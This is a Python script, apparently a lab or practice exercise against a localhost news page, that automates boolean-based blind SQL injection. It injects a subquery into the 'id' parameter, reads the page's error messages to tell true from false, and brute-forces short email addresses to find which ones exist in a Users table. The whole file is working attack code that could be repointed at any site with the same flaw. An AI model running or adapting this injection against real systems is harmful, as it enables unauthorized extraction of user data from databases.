import requests
from itertools import product



# Función para realizar la consulta normal mas la subconsulta sqli
def consultaCompleta(subconsulta):
    """
    Realiza una consulta SQLi en la URL proporcionada y devuelve True si la consulta fue exitosa, 
    de lo contrario, devuelve False.
    El exito se determina según el contenido de la respuesta, sabiendo cuales son las respuestas en caso de error.
    Cuando no estan en estos casos, se toma como exitosa la consulta blind sqli.
    """



    url = "http://localhost/v3/news.php"
    full_url = f"{url}?id=1 and ({subconsulta})"
    response = requests.get(full_url)
    
    if "No hay noticias disponibles." in response.text:  
        return False
    elif "La noticia no existe." in response.text:
        return False
    elif "Se produjo un error:  <b>PERO NO TE DOY INFORMACIÓN DEL ERROR.</b>" in response.text:
        return False
    else:
        return True

# Función para construir la subconsulta para el sqli
def subconsulta(nombreCampoUsers,valorCampoUsers):

    exito = False
    
    payload = f"SELECT 1 FROM Users WHERE {nombreCampoUsers} = '{valorCampoUsers}'"
    if consultaCompleta(payload):
        exito = True
    else:
         exito = False

    return exito

# Función para construir valores random para la subconsulta
def construirValoresEmail():
    """
    Genera direcciones de correo electrónico por fuerza bruta con un máximo 
    de 2 caracteres para el usuario y 2 caracteres para el dominio.
    Siempre es .com
    """
    caracteres_usuario = "abcdefghijklmnopqrstuvwxyz"  # Caracteres para el usuario
    caracteres_dominio = "abcdefghijklmnopqrstuvwxyz"  # Caracteres para el dominio

    for longitud_usuario in range(1, 3):  # Genera usuarios de 1 a 2 caracteres
        for usuario_tuple in product(caracteres_usuario, repeat=longitud_usuario):
            usuario = "".join(usuario_tuple)
            for longitud_dominio in range(1, 2):  # Genera dominios de 1 caracter.
                for dominio_tuple in product(caracteres_dominio, repeat=longitud_dominio):
                    dominio = "".join(dominio_tuple)
                    email = f"{usuario}@{dominio}.com"
                    yield email
    
    print(" # Se probaron todas las combinaciones posibles de emails #")



def main():
    """
    Creo el programa para trabajar con un solo campo, por razones de tiempo. Aunque,
      la lógica es la misma para cualquier campo.
    """
    for email in construirValoresEmail():
        if subconsulta("email", email):
            print(f"Email encontrado: {email}")




# Comienza el script
main()
